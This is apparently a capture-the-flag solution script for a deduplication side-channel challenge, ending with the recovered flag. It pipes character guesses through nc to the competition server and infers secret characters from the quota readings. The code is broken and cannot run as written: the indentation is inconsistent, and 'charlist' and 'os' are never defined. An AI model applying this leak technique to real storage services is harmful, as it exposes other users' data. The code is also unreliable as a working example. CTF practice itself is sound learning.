flaglist = ['C','T','F','{']

for i in range(16):
	os.system('python charloop.py ' + "".join(flaglist) +' | nc filestore.2021.ctfcompetition.com 1337 -i 1 | tee fileout'+str(i)+'.txt')
	with open("fileout"+str(i)+".txt","r") as fi:
		id = []
	    for ln in fi:
			if ln.startswith("Quota:"):
			    print(ln)    	
		for i in range(len(id)-2):
			if id[i] == id[i+1]:
				flaglist.append(charlist[i+1])
		print("found flag character: " + charlist[i+1])
	print(flaglist)	
	print("".join(flaglist))


CTF{CR1M3_0f_d3dup1ic4ti0n}